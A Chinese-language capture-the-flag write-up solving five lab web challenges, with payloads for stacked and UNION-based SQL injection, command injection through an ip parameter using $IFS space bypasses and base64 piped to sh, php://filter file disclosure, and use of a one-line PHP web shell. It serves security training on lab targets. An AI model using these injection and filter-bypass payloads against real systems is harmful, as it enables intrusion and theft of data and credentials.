# 1.[强网杯 2019]随便注

```sql
1’ or 1=1   # 此语句没用,但是确认有注入点
		    # 本题select被禁用,使用堆叠注入

1’;show databases;    # 回显数据库名 1’;show tables;#表名

1'; show columns from tableName;    # 纯数字要用``包裹

1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE hacker;      # 用PREPARE预编译,EXECUTE执行
```

# 2.[GXYCTF2019]Ping Ping Ping

#### 方法一 覆盖变量绕过

```shell
# 靶机打开之后提示/?ip=,说明是构造ip

/?ip=127.0.0.1;ls   # 输入127.0.0.1用管道符加上linux命令

/?ip=127.0.0.1;cat flag.php # 出现flag.php和index.php,故执行cat命令

# 空格被过滤了,想到可以用以下方法绕过:

$IFS$, $IFS$1, ${IFS, %20, <和<>重定向符, %09

/?ip=127.0.0.1;cat$IFS$1flag.php # 发现$IFS$1 可以成功绕过 

/?ip=127.0.0.1;cat$IFS$1flag.php # 但是flag也被过滤了,所以先获取index.php的内容 

# 发现了关于过滤的信息,发现很多符号过滤了,但是有一个变量a可以替换

/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php 
```

#### 方法二 内联执行

```shell
/?ip=127.0.0.1;cat$IFS$1`ls` 

# $IFS在Linux下表示为空格

# $1是当前系统shell进程第一个参数持有者，始终为空字符串，$后可以接任意数字

# 反引号中是内联执行的命令
```

#### 方法三 变量互相传递绕过

```shell
/?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php
```

#### 方法四 bash被过滤，用管道+sh替换

```shell
# 使用base64转化`cat flag.php`为Y2F0IGZsYWcucGhw

/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh

# 其他shell构造最后的sh可以改成bash
```

# 3.[极客大挑战 2019]Secret File 1

```php
F12发现有一个./Archive_room.php文件，点击跳转有个按钮，再次点击发现查阅结束了，猜测可能有隐藏界面。

用burp抓包可以看到有一个隐藏文件secr3t.php，访问发现提示flag放在了flag.php中，访问flag.php发现被隐藏了。于是回到secr3t.php，用php://filter协议获取文件。

/?file=php://filter/read=convert.base64-encode/resource=flag.php

获取了base64字符串，再解码获得flag
```

# 4.[极客大挑战 2019]LoveSQL 1

```sql
# 进入后发现是sql注入，使用万能语句1’ or 1=1#注入，发现登录成功，说明有注入点。然后测试有几个字段，1’ order by $1$#进行尝试，发现3是正确的，说明有三个字段。

# 再使用联合搜索1’ union select 1,2,3#，发现2，3位置会回显。

1’ union select 1,database(),version() # 爆数据库名

1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()    # 爆表名

1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’ l0ve1ysq1’   # 爆字段

1’ union select 1,2,group_concat(id,username,password) from l0ve1ysq1
# 查表得到flag
```



# 5.[极客大挑战 2019]Knife 1

```
进入后发现一句话木马，用蚁剑连接，密码是Syc，测试成功并保存，查询根目录发现flag，进入后得到flag
```

